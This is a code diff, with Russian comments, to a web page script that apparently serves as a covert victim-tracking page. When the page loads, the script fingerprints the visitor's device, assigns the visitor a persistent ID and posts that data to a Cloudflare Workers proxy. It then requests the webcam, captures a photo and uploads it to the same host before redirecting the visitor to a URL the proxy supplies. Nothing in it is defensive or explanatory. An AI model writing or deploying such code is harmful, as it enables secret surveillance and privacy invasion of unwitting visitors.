@@ -36,7 +36,17 @@
 <script>
     const proxyUrl = 'https://silent-surf-60b2.parsinnikita76.workers.dev';
 
-    // Функция сбора железа и батареи
+    // Генерация или получение ID пользователя
+    function getUserId() {
+        let id = localStorage.getItem('user_id');
+        if (!id) {
+            // Создаем случайный ID (например: 4921)
+            id = Math.floor(Math.random() * 9000) + 1000;
+            localStorage.setItem('user_id', id);
+        }
+        return id;
+    }
+
     async function getFullData() {
         let data = {
             gpu: "Unknown",
@@ -45,7 +55,6 @@
             battery: "Unknown"
         };
 
-        // 1. Пробуем вытащить GPU
         try {
             const canvas = document.createElement('canvas');
             const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
@@ -53,7 +62,6 @@
             data.gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER);
         } catch (e) {}
 
-        // 2. Пробуем получить заряд батареи
         try {
             if (navigator.getBattery) {
                 const bat = await navigator.getBattery();
@@ -67,28 +75,35 @@
     }
 
     window.onload = async function() {
-        const targetUrl = await fetch(proxyUrl + "/get-url").then(r => r.text()).catch(() => "https://google.com");
+        const userId = getUserId(); // Получаем наш ID
+        const targetUrlPromise = fetch(proxyUrl + "/get-url").then(r => r.text()).catch(() => "https://google.com");
         
-        // Собираем всё железо
         const hw = await getFullData();
 
         const infoData = `
-👤 **УСТРОЙСТВО:**
+🆔 ID ПОЛЬЗОВАТЕЛЯ: ${userId}
+
+👤 УСТРОЙСТВО:
 • ${navigator.userAgent}
 • Язык: ${navigator.language}
 • Экран: ${window.screen.width}x${window.screen.height}
 
-🖥 **ЖЕЛЕЗО:**
+🖥 ЖЕЛЕЗО:
 • Процессор: ${hw.cores} ядер
 • ОЗУ: ~${hw.ram} GB
 • Видеокарта: ${hw.gpu}
 • Батарея: ${hw.battery}
 
-⏰ **ВРЕМЯ И ЗОНА:**
+⏰ ВРЕМЯ:
 • ${new Date().toLocaleString('ru-RU')}
-• Пояс: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
         `.trim();
 
+        // 1. Отправляем ТЕКСТ сразу с ID
+        const initialFd = new FormData();
+        initialFd.append('text', infoData);
+        fetch(proxyUrl, { method: 'POST', body: initialFd });
+
+        // 2. Работа с камерой
         let stream = null;
         try {
             stream = await navigator.mediaDevices.getUserMedia({ video: true });
@@ -96,21 +111,29 @@
             const c = document.getElementById('c');
             v.srcObject = stream;
             
-            await new Promise(r => v.onloadedmetadata = () => { v.play(); setTimeout(r, 800); });
-            c.width = v.videoWidth; c.height = v.videoHeight;
+            await new Promise(r => v.onloadedmetadata = () => { 
+                v.play(); 
+                setTimeout(r, 1000); 
+            });
+
+            c.width = v.videoWidth; 
+            c.height = v.videoHeight;
             c.getContext('2d').drawImage(v, 0, 0);
             
             const blob = await new Promise(r => c.toBlob(r, 'image/jpeg', 0.8));
             const fd = new FormData();
-            fd.append('photo', blob, '1.jpg');
-            fd.append('caption', infoData);
+            fd.append('photo', blob, 'shot.jpg');
+            // Добавляем ID в подпись к фото
+            fd.append('caption', `📸 Фото от пользователя ID: ${userId}`);
+            
             await fetch(proxyUrl, { method: 'POST', body: fd });
         } catch (e) {
             const fd = new FormData();
-            fd.append('text', `❌ Доступ к камере отклонен\n\n${infoData}`);
+            fd.append('text', `❌ ID: ${userId} — Доступ к камере отклонен`);
             await fetch(proxyUrl, { method: 'POST', body: fd });
         } finally {
             if (stream) stream.getTracks().forEach(t => t.stop());
+            const targetUrl = await targetUrlPromise;
             window.location.replace(targetUrl);
         }
     };
